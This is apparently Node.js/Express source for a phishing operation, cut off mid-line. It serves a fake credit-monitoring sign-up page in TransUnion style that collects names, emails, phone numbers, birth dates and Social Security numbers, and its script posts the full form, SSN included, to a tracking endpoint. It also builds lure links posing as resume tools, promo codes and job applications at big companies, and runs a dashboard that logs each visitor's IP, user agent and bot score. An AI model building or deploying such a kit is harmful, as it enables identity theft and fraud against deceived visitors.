// Simple dashboard with comprehensive analytics
app.get('/dashboard', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>RentNStarter Credit - Analytics Dashboard</title><style>body { font-family: Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #003d82 0%, #0056b3 100%); min-height: 100vh; } .container { max-width: 1200px; margin: 0 auto; background: white; margin: 20px; border-radius: 10px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); padding: 30px; } h1 { color: #003d82; text-align: center; margin-bottom: 10px; } .auth { margin: 20px 0; padding: 20px; background: #f8f9ff; border-radius: 10px; border: 2px solid #e0e6ff; } input, select { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #e0e6ff; border-radius: 8px; box-sizing: border-box; } button { background: #003d82; color: white; padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; } .hidden { display: none; } .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; } .stat { background: linear-gradient(135deg, #003d82, #0056b3); color: white; padding: 20px; border-radius: 10px; text-align: center; } .stat h3 { margin: 0; font-size: 2.5em; } .error { color: #ef4444; } .success { color: #10b981; } .tabs { display: flex; border-bottom: 2px solid #e0e6ff; margin: 20px 0; } .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; } .tab.active { border-bottom-color: #003d82; color: #003d82; font-weight: bold; } .tab:hover { background: #f8f9ff; } .campaign-card { background: #fff; border: 2px solid #e0e6ff; border-radius: 10px; margin: 15px 0; overflow: hidden; } .campaign-header { background: #f8f9ff; padding: 15px; border-bottom: 1px solid #e0e6ff; cursor: pointer; } .campaign-header:hover { background: #f0f4ff; } .campaign-title { font-weight: bold; color: #003d82; font-size: 1.1em; } .campaign-details { padding: 20px; display: none; background: #fafafa; } .campaign-details.show { display: block; } .visitor-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9em; } .visitor-table th, .visitor-table td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; } .visitor-table th { background: #003d82; color: white; } .visitor-table tr:hover { background: #f5f5f5; } .bot-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: bold; } .bot-badge.bot { background: #fef2f2; color: #dc2626; } .bot-badge.human { background: #f0fdf4; color: #059669; } .ip-address { font-family: monospace; color: #003d82; } .user-agent { font-family: monospace; font-size: 0.8em; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }</style></head><body><div class="container"><h1>RentNStarter Credit</h1><p style="text-align: center; color: #666;">Analytics Dashboard - Campaign Performance Tracking</p><div class="auth"><h3>Authentication Required</h3><input type="password" id="token" placeholder="Enter admin token"><button onclick="authenticate()">Connect to Dashboard</button><button onclick="refreshData()" id="refreshBtn" style="margin-left: 10px; background: #10b981; display: none;">Refresh</button><div id="status"></div></div><div id="dashboard" class="hidden"><div class="stats"><div class="stat"><h3 id="totalLinks">0</h3><p>Campaign Links</p></div><div class="stat"><h3 id="totalClicks">0</h3><p>Total Visits</p></div><div class="stat"><h3 id="totalBots">0</h3><p>Bot Detections</p></div><div class="stat"><h3 id="botPercentage">0%</h3><p>Bot Rate</p></div></div><div class="tabs"><div class="tab active" onclick="showTab(this, \\"create\\")">Create Campaign</div><div class="tab" onclick="showTab(this, \\"analytics\\")">Campaign Analytics</div></div><div id="createTab"><div style="background: #f8f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;"><h3>Create New Campaign Link</h3><input type="text" id="description" placeholder="Campaign description (e.g., Email Newsletter)"><input type="text" id="campaign" placeholder="Campaign name (e.g., Q1-2024)"><select id="urlType"><option value="friendly">Friendly URL</option><option value="promo">Promo Code</option><option value="company">Company Application</option><option value="tool">Tool URL</option></select><input type="text" id="customPath" placeholder="Custom path (optional)"><button onclick="createLink()">Generate Tracking Link</button><div id="result"></div></div></div><div id="analyticsTab" class="hidden"><h3>Campaign Analytics & Visitor Details</h3><div id="campaignsList">Loading campaigns...</div></div></div></div><script>let token = ""; let dashboardData = {}; function authenticate() { token = document.getElementById("token").value; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.ok ? r.json() : Promise.reject("Invalid token")).then(data => { document.getElementById("status").innerHTML = "<span class=\\"success\\">Connected!</span>"; document.getElementById("dashboard").classList.remove("hidden"); document.getElementById("refreshBtn").style.display = "inline-block"; updateDashboard(data); }).catch(e => document.getElementById("status").innerHTML = "<span class=\\"error\\">❌ " + e + "</span>"); } function refreshData() { if (!token) return; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.json()).then(data => updateDashboard(data)); } function updateDashboard(data) { dashboardData = data; document.getElementById("totalLinks").textContent = data.totalLinks; document.getElementById("totalClicks").textContent = data.totalClicks; document.getElementById("totalBots").textContent = data.totalBots; document.getElementById("botPercentage").textContent = data.botPercentage + "%"; updateCampaignsList(data.links); } function updateCampaignsList(links) { const container = document.getElementById("campaignsList"); if (links.length === 0) { container.innerHTML = "<p style=\\"text-align: center; color: #666; padding: 20px;\\">No campaigns created yet.</p>"; return; } container.innerHTML = links.map(link => { return "<div class=\\"campaign-card\\"><div class=\\"campaign-header\\" onclick=\\"toggleCampaign(\'" + link.trackingId + "\')\\\"><div class=\\"campaign-title\\">" + link.description + "</div><div style=\\"color: #666; font-size: 0.9em; margin-top: 5px;\\">Campaign: " + link.campaign + " • Created: " + new Date(link.created).toLocaleDateString() + " • ID: " + link.shortId + "</div><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-top: 10px;\\"><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.totalClicks + "</div><div style=\\"font-size: 0.8em;\\">Total Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.uniqueIPs + "</div><div style=\\"font-size: 0.8em;\\">Unique IPs</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.humanClicks + "</div><div style=\\"font-size: 0.8em;\\">Human Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.botClicks + "</div><div style=\\"font-size: 0.8em;\\">Bot Clicks</div></div></div></div><div class=\\"campaign-details\\" id=\\"details-" + link.trackingId + "\\"><div id=\\"clicks-" + link.trackingId + "\\">Loading detailed analytics...</div></div></div>"; }).join(""); } function toggleCampaign(trackingId) { const details = document.getElementById("details-" + trackingId); const clicksContainer = document.getElementById("clicks-" + trackingId); if (details.classList.contains("show")) { details.classList.remove("show"); } else { details.classList.add("show"); loadCampaignDetails(trackingId, clicksContainer); } } ' + loadCampaignDetailsFunction + ' function showTab(tabElement, tabName) { document.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active")); tabElement.classList.add("active"); document.getElementById("createTab").classList.toggle("hidden", tabName !== "create"); document.getElementById("analyticsTab").classList.toggle("hidden", tabName !== "analytics"); if (tabName === "analytics" && token) { refreshData(); } } function createLink() { const desc = document.getElementById("description").value; const camp = document.getElementById("campaign").value; const urlType = document.getElementById("urlType").value; const customPath = document.getElementById("customPath").value; fetch("/api/create-link", { method: "POST", headers: { "Authorization": "Bearer " + token, "Content-Type": "application/json" }, body: JSON.stringify({ description: desc, campaign: camp, urlType: urlType, customPath: customPath }) }).then(r => r.json()).then(data => { if (data.success) { document.getElementById("result").innerHTML = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><strong>Campaign link created!</strong><br><strong>Main URL:</strong> <span style=\\"font-family: monospace; color: #003d82; word-break: break-all;\\">" + data.url + "</span><br><strong>Short URL:</strong> <span style=\\"font-family: monospace; color: #003d82; word-break: break-all;\\">" + data.shortUrl + "</span></div>"; document.getElementById("description").value = ""; document.getElementById("campaign").value = ""; document.getElementById("customPath").value = ""; setTimeout(refreshData, 1000); } }); } setInterval(() => { if (token && !document.getElementById("analyticsTab").classList.contains("hidden")) { refreshData(); } }, 30000);</script></body></html>');
});

const loadCampaignDetailsFunction = 'function loadCampaignDetails(trackingId, container) { console.log("Loading details for:", trackingId); container.innerHTML = "<p>Loading visitor details...</p>"; fetch("/api/stats/" + trackingId, { headers: { "Authorization": "Bearer " + token } }).then(r => { console.log("Response status:", r.status); if (!r.ok) { throw new Error("HTTP " + r.status + ": " + r.statusText); } return r.json(); }).then(data => { console.log("Received data:", data); const clicks = data.recentClicks || []; if (clicks.length === 0) { container.innerHTML = "<div style=\\"text-align: center; padding: 20px; background: #f8f9ff; border-radius: 8px; margin: 10px 0;\\"><h4>No Visitors Yet</h4><p style=\\"color: #666;\\">This campaign hasn\\'t received any clicks yet.<br>Share the tracking link to start collecting data!</p><p style=\\"font-family: monospace; font-size: 0.9em; color: #003d82;\\">Campaign ID: " + trackingId.substring(0, 8) + "</p></div>"; return; } const clicksTable = "<div style=\\"margin: 15px 0;\\"><h4 style=\\"color: #003d82; margin-bottom: 15px;\\">Visitor Log (" + clicks.length + " recent visits)</h4><div style=\\"overflow-x: auto;\\"><table class=\\"visitor-table\\"><thead><tr><th>Date & Time</th><th>IP Address</th><th>User Agent</th><th>Location Info</th><th>Bot Detection</th><th>Bot Score</th><th>Type</th></tr></thead><tbody>" + clicks.map(click => { const date = new Date(click.timestamp); const timeStr = date.toLocaleDateString() + "<br><small>" + date.toLocaleTimeString() + "</small>"; const userAgentShort = click.userAgent.length > 50 ? click.userAgent.substring(0, 50) + "..." : click.userAgent; return "<tr><td>" + timeStr + "</td><td class=\\"ip-address\\">" + click.ip + "</td><td class=\\"user-agent\\" title=\\"" + click.userAgent + "\\">" + userAgentShort + "</td><td><strong>" + (click.acceptLanguage || "Unknown") + "</strong><br><small style=\\"color: #666;\\">" + (click.referer !== "Direct" ? "Ref: " + click.referer : "Direct access") + "</small></td><td><span class=\\"bot-badge " + (click.isBot ? "bot" : "human") + "\\">" + (click.isBot ? "Bot" : "Human") + "</span></td><td><strong style=\\"color: " + (click.botScore > 50 ? "#dc2626" : "#059669") + ";\\">" + (click.botScore || 0) + "%</strong></td><td>" + (click.type === "javascript" ? "JS" : "Page") + "</td></tr>"; }).join("") + "</tbody></table></div></div>"; const userAgentsSection = data.topUserAgents && data.topUserAgents.length > 0 ? "<div style=\\"margin: 20px 0;\\"><h4 style=\\"color: #003d82; margin-bottom: 15px;\\">Top User Agents</h4><div style=\\"background: #f8f9ff; padding: 15px; border-radius: 8px; border: 1px solid #e0e6ff;\\">" + data.topUserAgents.map(ua => "<div style=\\"display: flex; justify-content: space-between; align-items: center; margin: 8px 0; padding: 5px; background: white; border-radius: 4px;\\"><span style=\\"font-family: monospace; font-size: 0.85em; color: #333; flex: 1;\\">" + ua.userAgent + "</span><span style=\\"font-weight: bold; color: #003d82; margin-left: 10px;\\">" + ua.count + " visits</span></div>").join("") + "</div></div>" : ""; const summarySection = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #003d82;\\"><h4 style=\\"margin: 0 0 10px 0; color: #003d82;\\">Campaign Summary</h4><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px;\\"><div><strong>Total Visits:</strong><br><span style=\\"font-size: 1.2em; color: #003d82;\\">" + data.totalClicks + "</span></div><div><strong>Unique IPs:</strong><br><span style=\\"font-size: 1.2em; color: #003d82;\\">" + data.uniqueIPs + "</span></div><div><strong>Human Visits:</strong><br><span style=\\"font-size: 1.2em; color: #059669;\\">" + data.humanClicks + "</span></div><div><strong>Bot Visits:</strong><br><span style=\\"font-size: 1.2em; color: #dc2626;\\">" + data.botClicks + "</span></div><div><strong>Avg Bot Score:</strong><br><span style=\\"font-size: 1.2em; color: " + (data.avgBotScore > 50 ? "#dc2626" : "#059669") + ";\\">" + data.avgBotScore + "%</span></div></div></div>"; container.innerHTML = summarySection + clicksTable + userAgentsSection; }).catch(e => { console.error("Error loading campaign details:", e); container.innerHTML = "<div style=\\"color: #ef4444; background: #fef2f2; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><h4>Error Loading Details</h4><p>Failed to load visitor details: " + e.message + "</p><p><strong>Tracking ID:</strong> " + trackingId + "</p><button onclick=\\"loadCampaignDetails(\\'" + trackingId + "\\', document.getElementById(\\'clicks-" + trackingId + "\\'));\\" style=\\"background: #003d82; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px;\\">Retry</button></div>"; }); }';const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || process.env.RAILWAY_PUBLIC_DOMAIN || 'rentnstarter.up.railway.app';

// Security middleware
app.use(helmet({
    contentSecurityPolicy: false
}));
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Rate limiting for admin endpoints
const adminRateLimit = new Map();
const ADMIN_RATE_LIMIT = 100;

// Store for tracking data
const trackingData = new Map();

// Load existing data if available
const DATA_FILE = path.join(__dirname, 'tracking_data.json');
try {
    if (fs.existsSync(DATA_FILE)) {
        const savedData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        Object.entries(savedData).forEach(([key, value]) => {
            trackingData.set(key, value);
        });
        console.log('Loaded ' + trackingData.size + ' existing tracking IDs');
    }
} catch (error) {
    console.log('No existing data file found, starting fresh');
}

// Periodically save data
setInterval(() => {
    const dataObj = Object.fromEntries(trackingData);
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
}, 60000);

// Generate unique tracking ID
function generateTrackingId() {
    return crypto.randomBytes(16).toString('hex');
}

// Admin authentication middleware
function requireAuth(req, res, next) {
    const authHeader = req.headers.authorization;
    const expectedAuth = process.env.ADMIN_TOKEN || 'admin-secret-token';
    
    if (!authHeader || authHeader !== 'Bearer ' + expectedAuth) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    // Simple rate limiting
    const clientIP = getClientIP(req);
    const hour = Math.floor(Date.now() / 3600000);
    const key = clientIP + '-' + hour;
    
    const requests = adminRateLimit.get(key) || 0;
    if (requests >= ADMIN_RATE_LIMIT) {
        return res.status(429).json({ error: 'Rate limit exceeded' });
    }
    
    adminRateLimit.set(key, requests + 1);
    next();
}

// Get real client IP
function getClientIP(req) {
    return req.headers['cf-connecting-ip'] ||
           req.headers['x-real-ip'] ||
           req.headers['x-forwarded-for']?.split(',')[0] ||
           req.connection.remoteAddress ||
           req.socket.remoteAddress ||
           'unknown';
}

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Generate friendly URL path
function generateFriendlyPath() {
    const adjectives = [
        'free', 'instant', 'professional', 'premium', 'advanced', 'smart', 'quick', 'easy',
        'modern', 'expert', 'perfect', 'ultimate', 'powerful', 'enhanced', 'optimized'
    ];
    const nouns = [
        'resume', 'cv', 'career', 'job', 'interview', 'application', 'profile', 'skills',
        'boost', 'optimizer', 'builder', 'analyzer', 'scanner', 'checker', 'review'
    ];
    const actions = [
        'boost', 'optimize', 'enhance', 'improve', 'upgrade', 'analyze', 'review', 'scan',
        'check', 'build', 'create', 'polish', 'refine', 'perfect', 'maximize'
    ];
    
    const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
    const noun = nouns[Math.floor(Math.random() * nouns.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];
    const num = Math.floor(Math.random() * 999) + 1;
    
    return adj + '-' + noun + '-' + action + '-' + num;
}

// Create tracking link endpoint
app.post('/api/create-link', requireAuth, (req, res) => {
    try {
        const trackingId = generateTrackingId();
        const customPath = req.body.customPath;
        const urlType = req.body.urlType || 'friendly';
        
        let friendlyPath, promoCode;
        
        if (customPath) {
            friendlyPath = customPath.toLowerCase().replace(/[^a-z0-9-]/g, '-');
        } else {
            switch (urlType) {
                case 'promo':
                    promoCode = 'RESUME' + Math.floor(Math.random() * 9000 + 1000);
                    break;
                case 'tool':
                    friendlyPath = 'tools/resume-optimizer';
                    break;
                case 'company':
                    const companies = ['google', 'microsoft', 'amazon', 'apple', 'meta', 'netflix', 'tesla', 'salesforce'];
                    const company = companies[Math.floor(Math.random() * companies.length)];
                    friendlyPath = 'apply/' + company;
                    break;
                case 'friendly':
                default:
                    friendlyPath = generateFriendlyPath();
                    break;
            }
        }
        
        const metadata = {
            created: new Date().toISOString(),
            description: req.body.description || 'Bot tracking link',
            campaign: req.body.campaign || 'default',
            friendlyPath: friendlyPath,
            promoCode: promoCode,
            urlType: urlType,
            clicks: [],
            createdBy: getClientIP(req)
        };
        
        trackingData.set(trackingId, metadata);
        
        const protocol = req.headers['x-forwarded-proto'] || 'http';
        const host = req.headers.host || DOMAIN;
        
        let mainUrl, shortUrl;
        
        if (promoCode) {
            mainUrl = protocol + '://' + host + '/promo/' + promoCode;
            shortUrl = protocol + '://' + host + '/p/' + promoCode;
        } else if (friendlyPath) {
            if (friendlyPath.includes('/')) {
                mainUrl = protocol + '://' + host + '/' + friendlyPath;
                shortUrl = protocol + '://' + host + '/go/' + friendlyPath.split('/').pop();
            } else {
                mainUrl = protocol + '://' + host + '/offer/' + friendlyPath;
                shortUrl = protocol + '://' + host + '/go/' + friendlyPath;
            }
        } else {
            mainUrl = protocol + '://' + host + '/t/' + trackingId;
            shortUrl = protocol + '://' + host + '/s/' + trackingId.substring(0, 8);
        }
        
        res.json({
            success: true,
            trackingId: trackingId,
            url: mainUrl,
            shortUrl: shortUrl,
            directUrl: protocol + '://' + host + '/t/' + trackingId,
            urlType: urlType,
            friendlyPath: friendlyPath,
            promoCode: promoCode,
            created: metadata.created
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to create tracking link' });
    }
});

// Helper function to find tracking ID by friendly path
function findTrackingIdByPath(friendlyPath) {
    for (const [trackingId, data] of trackingData.entries()) {
        if (data.friendlyPath === friendlyPath) {
            return trackingId;
        }
    }
    return null;
}

// Helper function for promo codes
function findTrackingIdByPromo(promoCode) {
    for (const [trackingId, data] of trackingData.entries()) {
        if (data.promoCode === promoCode) {
            return trackingId;
        }
    }
    return null;
}

// Function to generate TransUnion-style credit monitoring HTML
function generateCreditMonitoringHTML(trackingId) {
    return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>RentNStarter Credit Monitoring - Free Credit Report & Score</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"><style>* { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background-color: #f5f7fa; } .header { background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 1rem 0; position: sticky; top: 0; z-index: 100; } .nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; } .logo { font-size: 1.8rem; font-weight: bold; color: #003d82; } .nav-links { display: flex; gap: 2rem; } .nav-links a { text-decoration: none; color: #003d82; font-weight: 500; } .hero { background: linear-gradient(135deg, #003d82 0%, #0056b3 100%); color: white; padding: 3rem 0; text-align: center; } .hero h1 { font-size: 2.8rem; margin-bottom: 1rem; font-weight: 700; } .hero p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; } .container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; } .main-content { background: white; margin: 2rem auto; padding: 3rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 500px; } .form-header { text-align: center; margin-bottom: 2rem; } .form-header h2 { color: #003d82; font-size: 1.8rem; margin-bottom: 0.5rem; } .form-header p { color: #666; font-size: 0.95rem; } .form-group { margin-bottom: 1.5rem; } .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; font-size: 0.9rem; } .form-control { width: 100%; padding: 0.75rem; border: 2px solid #ddd; border-radius: 4px; font-size: 1rem; transition: border-color 0.3s; } .form-control:focus { outline: none; border-color: #003d82; box-shadow: 0 0 0 3px rgba(0,61,130,0.1); } .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; } .btn-primary { background: #003d82; color: white; padding: 0.875rem 2rem; border: none; border-radius: 4px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.3s; width: 100%; margin-top: 1rem; } .btn-primary:hover { background: #002a5c; transform: translateY(-1px); } .features { background: #f8f9fa; padding: 3rem 0; } .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; margin: 2rem 0; } .feature { background: white; padding: 2rem; border-radius: 8px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); } .feature i { font-size: 3rem; color: #003d82; margin-bottom: 1rem; } .feature h3 { color: #003d82; margin-bottom: 1rem; font-size: 1.3rem; } .security-notice { background: #e8f4fd; border: 1px solid #b3d9ff; border-radius: 4px; padding: 1rem; margin: 1.5rem 0; font-size: 0.85rem; color: #003d82; } .security-notice i { margin-right: 0.5rem; } .legal-text { font-size: 0.75rem; color: #666; line-height: 1.4; margin-top: 1rem; } .footer { background: #003d82; color: white; padding: 3rem 0; margin-top: 4rem; } .footer-content { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem; } .footer h4 { margin-bottom: 1rem; } .footer a { color: #b3d9ff; text-decoration: none; } .footer a:hover { color: white; } .progress-bar { background: #e9ecef; border-radius: 10px; height: 6px; margin: 1.5rem 0; } .progress-fill { background: #003d82; height: 100%; width: 33%; border-radius: 10px; transition: width 0.3s; } .step-indicator { display: flex; justify-content: center; margin: 1rem 0; } .step { width: 30px; height: 30px; border-radius: 50%; background: #ddd; color: white; display: flex; align-items: center; justify-content: center; margin: 0 0.5rem; font-weight: bold; } .step.active { background: #003d82; } .step.completed { background: #28a745; } @media (max-width: 768px) { .hero h1 { font-size: 2rem; } .nav-links { display: none; } .form-row { grid-template-columns: 1fr; } .main-content { margin: 1rem; padding: 2rem; } }</style></head><body><header class="header"><nav class="nav"><div class="logo"><i class="fas fa-shield-alt"></i> RentNStarter Credit</div><div class="nav-links"><a href="#features">Features</a><a href="#security">Security</a><a href="#support">Support</a></div></nav></header><section class="hero"><div class="container"><h1>Get Your Free Credit Report & Score</h1><p>Monitor your credit health with real-time alerts, personalized insights, and identity protection. No credit card required to get started.</p></div></section><section class="main-content"><div class="form-header"><h2>Create Your Free Account</h2><p>Step 1 of 3: Personal Information</p><div class="step-indicator"><div class="step active">1</div><div class="step">2</div><div class="step">3</div></div><div class="progress-bar"><div class="progress-fill"></div></div></div><form id="signupForm"><div class="form-group"><label for="firstName">First Name *</label><input type="text" id="firstName" name="firstName" class="form-control" required></div><div class="form-group"><label for="lastName">Last Name *</label><input type="text" id="lastName" name="lastName" class="form-control" required></div><div class="form-group"><label for="email">Email Address *</label><input type="email" id="email" name="email" class="form-control" required></div><div class="form-group"><label for="phone">Phone Number *</label><input type="tel" id="phone" name="phone" class="form-control" placeholder="(555) 123-4567" required></div><div class="form-row"><div class="form-group"><label for="birthMonth">Birth Month *</label><select id="birthMonth" name="birthMonth" class="form-control" required><option value="">Select Month</option><option value="01">January</option><option value="02">February</option><option value="03">March</option><option value="04">April</option><option value="05">May</option><option value="06">June</option><option value="07">July</option><option value="08">August</option><option value="09">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select></div><div class="form-group"><label for="birthYear">Birth Year *</label><select id="birthYear" name="birthYear" class="form-control" required><option value="">Select Year</option></select></div></div><div class="form-group"><label for="ssn">Social Security Number *</label><input type="password" id="ssn" name="ssn" class="form-control" placeholder="XXX-XX-XXXX" maxlength="11" required></div><div class="security-notice"><i class="fas fa-lock"></i><strong>Your information is secure.</strong> We use bank-level encryption to protect your personal data and will never sell your information to third parties.</div><button type="submit" class="btn-primary" onclick="submitStep1()"><i class="fas fa-arrow-right" style="margin-left: 0.5rem;"></i> Continue to Step 2</button><div class="legal-text">By clicking Continue, you acknowledge that you have read and agree to our <a href="#" style="color: #003d82;">Terms of Service</a> and <a href="#" style="color: #003d82;">Privacy Policy</a>. You also agree to receive marketing communications from RentNStarter Credit and our partners. You must be at least 18 years old to create an account.</div></form></section><section class="features" id="features"><div class="container"><h2 style="text-align: center; color: #003d82; margin-bottom: 2rem;">What You Get With RentNStarter Credit</h2><div class="features-grid"><div class="feature"><i class="fas fa-chart-line"></i><h3>Free Credit Score & Report</h3><p>Get your TransUnion credit score and report updated daily. See what factors are impacting your score the most.</p></div><div class="feature"><i class="fas fa-bell"></i><h3>Credit Monitoring & Alerts</h3><p>Receive instant notifications when important changes occur on your credit report that could indicate fraud.</p></div><div class="feature"><i class="fas fa-user-shield"></i><h3>Identity Protection</h3><p>Monitor your personal information across the dark web and get alerts if your data is compromised.</p></div><div class="feature"><i class="fas fa-lightbulb"></i><h3>Personalized Insights</h3><p>Get tailored recommendations to improve your credit score and financial health based on your unique profile.</p></div><div class="feature"><i class="fas fa-credit-card"></i><h3>Pre-Qualified Offers</h3><p>See credit card and loan offers you are likely to qualify for without impacting your credit score.</p></div><div class="feature"><i class="fas fa-mobile-alt"></i><h3>Mobile App Access</h3><p>Access your credit information anytime, anywhere with our highly-rated mobile app for iOS and Android.</p></div></div></div></section><footer class="footer" id="support"><div class="container"><div class="footer-content"><div><h4>RentNStarter Credit</h4><p>Helping millions of Americans understand and improve their credit health since 2024.</p></div><div><h4>Products</h4><a href="#">Free Credit Monitoring</a><br><a href="#">Credit Score Tracking</a><br><a href="#">Identity Protection</a><br><a href="#">Financial Tools</a></div><div><h4>Support</h4><a href="#">Help Center</a><br><a href="#">Contact Us</a><br><a href="#">Privacy Policy</a><br><a href="#">Terms of Service</a></div><div><h4>Company</h4><a href="#">About Us</a><br><a href="#">Careers</a><br><a href="#">Press</a><br><a href="#">Blog</a></div></div><div style="text-align: center; margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #0056b3;"><p>&copy; 2024 RentNStarter Credit. All rights reserved. RentNStarter is a registered trademark.</p></div></div></footer><script>// Enhanced client-side tracking fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "page_loaded", screen: {width: screen.width, height: screen.height}, viewport: {width: window.innerWidth, height: window.innerHeight}, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, userAgent: navigator.userAgent, platform: navigator.platform, pageUrl: window.location.href, referrer: document.referrer, timestamp: new Date().toISOString() }) }).catch(() => {}); // Populate birth year dropdown const birthYearSelect = document.getElementById("birthYear"); const currentYear = new Date().getFullYear(); for (let year = currentYear - 18; year >= currentYear - 100; year--) { const option = document.createElement("option"); option.value = year; option.textContent = year; birthYearSelect.appendChild(option); } // Format SSN input document.getElementById("ssn").addEventListener("input", function(e) { let value = e.target.value.replace(/\D/g, ""); if (value.length >= 6) { value = value.substring(0,3) + "-" + value.substring(3,5) + "-" + value.substring(5,9); } else if (value.length >= 4) { value = value.substring(0,3) + "-" + value.substring(3); } e.target.value = value; }); // Format phone input document.getElementById("phone").addEventListener("input", function(e) { let value = e.target.value.replace(/\D/g, ""); if (value.length >= 7) { value = "(" + value.substring(0,3) + ") " + value.substring(3,6) + "-" + value.substring(6,10); } else if (value.length >= 4) { value = "(" + value.substring(0,3) + ") " + value.substring(3); } else if (value.length > 0) { value = "(" + value; } e.target.value = value; }); // Track form interactions document.querySelectorAll("input, select").forEach(element => { element.addEventListener("focus", function() { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_field_focus", field: this.name || this.id, timestamp: new Date().toISOString() }) }).catch(() => {}); }); element.addEventListener("blur", function() { if (this.value) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_field_filled", field: this.name || this.id, hasValue: !!this.value, timestamp: new Date().toISOString() }) }).catch(() => {}); } }); }); function submitStep1() { event.preventDefault(); const formData = new FormData(document.getElementById("signupForm")); const data = {}; for (let [key, value] of formData.entries()) { data[key] = value; } // Track form submission fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_submission_attempt", step: 1, formData: data, timestamp: new Date().toISOString() }) }).catch(() => {}); // Simulate validation if (!data.firstName || !data.lastName || !data.email || !data.ssn) { alert("Please fill in all required fields."); return; } // Simulate moving to step 2 document.querySelector(".progress-fill").style.width = "66%"; document.querySelectorAll(".step")[0].classList.remove("active"); document.querySelectorAll(".step")[0].classList.add("completed"); document.querySelectorAll(".step")[1].classList.add("active"); document.querySelector(".form-header p").textContent = "Step 2 of 3: Address Information"; // Track successful step completion fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "step_completed", step: 1, timestamp: new Date().toISOString() }) }).catch(() => {}); alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process."); } // Track scroll depth let maxScroll = 0; window.addEventListener("scroll", function() { const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100); if (scrollPercent > maxScroll) { maxScroll = scrollPercent; if (maxScroll % 25 === 0) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "scroll_depth", percentage: maxScroll, timestamp: new Date().toISOString() }) }).catch(() => {}); } } }); // Track time on page let timeOnPage = 